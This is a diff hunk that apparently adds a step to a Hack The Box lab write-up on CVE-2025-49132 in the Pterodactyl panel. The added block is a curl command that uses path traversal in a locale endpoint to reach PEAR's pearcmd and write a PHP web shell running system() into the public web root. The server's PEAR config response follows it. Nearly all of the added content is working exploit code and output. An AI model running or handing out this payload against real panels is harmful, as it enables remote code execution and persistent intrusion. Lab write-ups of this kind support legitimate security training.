@@ -403,4 +403,14 @@ found: [https://github.com/Ahmedf000/CVE-2025-49132_HTB_SEASON10]
 
 [https://cvefeed.io/vuln/detail/CVE-2025-49132]
 
+```
+$ curl -g "http://panel.pterodactyl.htb/locales/locale.json?\
++config-create+/&\
+locale=../../../../../../usr/share/php/PEAR&\
+namespace=pearcmd&\
+/<?=system(hex2bin('77686f616d69'))?>+/var/www/pterodactyl/public/shell.php"
 
+Response:
+
+#PEAR_Config 0.9 a:12:{s:7:"php_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/php";s:8:"data_dir";s:111:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/data";s:7:"www_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/www";s:7:"cfg_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/cfg";s:7:"ext_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/ext";s:7:"doc_dir";s:111:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/docs";s:8:"test_dir";s:112:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/tests";s:9:"cache_dir";s:112:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/cache";s:12:"download_dir";s:115:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/download";s:8:"temp_dir";s:111:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/temp";s:7:"bin_dir";s:106:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear";s:7:"man_dir";s:110:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/wwwrun wwwrun/pear/man";}
+```
